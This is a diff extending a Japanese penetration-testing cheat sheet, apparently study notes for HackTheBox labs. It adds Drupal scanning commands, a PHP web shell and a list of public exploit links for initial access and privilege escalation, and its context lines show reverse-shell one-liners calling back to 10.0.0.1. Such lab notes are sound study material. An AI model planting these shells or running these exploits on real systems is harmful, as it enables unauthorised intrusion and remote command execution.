@@ -587,6 +587,26 @@ wpscan --url http://test.com/ --usernames admin --passwords /usr/share/wordlist/
 ```
 
 ### Drupal
+#### チェック項目
+```
+# バージョン確認
+/CHANGELOG.txt
+```
+
+#### droopescan
+```
+pip3 install droopescan
+```
+```
+droopescan scan drupal -u http://10.10.10.1 -t 32
+```
+- scan...スキャンの指定
+  - SilverStripe
+  - Wordpress
+  - Drupal
+- -u...URLの指定
+- -t...スレッド数の指定
+
 ```
 MySQLに接続するための認証情報が記述されている
 /var/www/html/sites/default/settings.php
@@ -1005,6 +1025,7 @@ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotob
 ```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 <?php echo system($_REQUEST ["cmd"]); ?>
+<?php echo(system($_GET["cmd"])); ?>
 ```
 
 ### Ruby
@@ -2470,6 +2491,15 @@ pip install xlrd
 systeminfo > systeminfo.txt
 ./windows-exploit-suggester.py -database 2020-06-08-mssb.xls -systeminfo systeminfo.txt
 ```
+
+### Sherlock.ps1
+```
+Find-AllVulns
+```
+
+### Watson.ps1
+
+
 ### Windows-kernel-exploits
 コンパイル済みのカーネルエクスプロイト用バイナリが用意されている。  
 Windows-kernel-exploits:  
@@ -2706,3 +2736,53 @@ https://github.com/itm4n/PrintSpoofer.git
 
 Windows-kernel-exploits:  
 https://github.com/SecWiki/windows-kernel-exploits.git
+
+# Experience with HackTheBox
+## Initial Shell(Linux)
+```
+Samba 3.0.20:
+https://github.com/amriunix/CVE-2007-2447.git
+
+Elastix 2.2.0:
+https://www.exploit-db.com/exploits/37637
+FreePBX 2.10.0/Elastix 2.2.0 - Remote Code Execution:
+https://www.exploit-db.com/exploits/18650
+'extension'はsvwarを使用してreqauthとなっている数値をを指定
+例) svwar -m INVITE -e100-999 10.10.10.7
+```
+
+## Privilege Escalation(Linux)
+```
+PAM 1.1.0:
+.sshディレクトリの権限を変更しておく(chmod 700 .ssh)
+https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/local/14339.sh
+```
+
+## Initial Shell(Windows)
+```
+MS08-067:
+https://github.com/andyacer/ms08_067
+
+HttpFileServer httpd 2.3:
+https://www.exploit-db.com/exploits/49125
+
+Drupal 7.x Module Services - Remote Code Execution:
+・sudo apt install php-curl
+・'data' => '<?php echo system($_REQUEST ["cmd"]); ?>'
+https://www.exploit-db.com/exploits/41564
+
+Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution:
+・sudo gem install highline
+https://www.exploit-db.com/exploits/44449
+```
+
+## Privilege Escalation(Windows)
+```
+Juicy-potato(x64):  
+https://github.com/ohpe/juicy-potato.git  
+Juicy-potato(x86バイナリ):  
+https://github.com/ivanitlearning/Juicy-Potato-x86.git
+
+MS16-098:
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098
+```
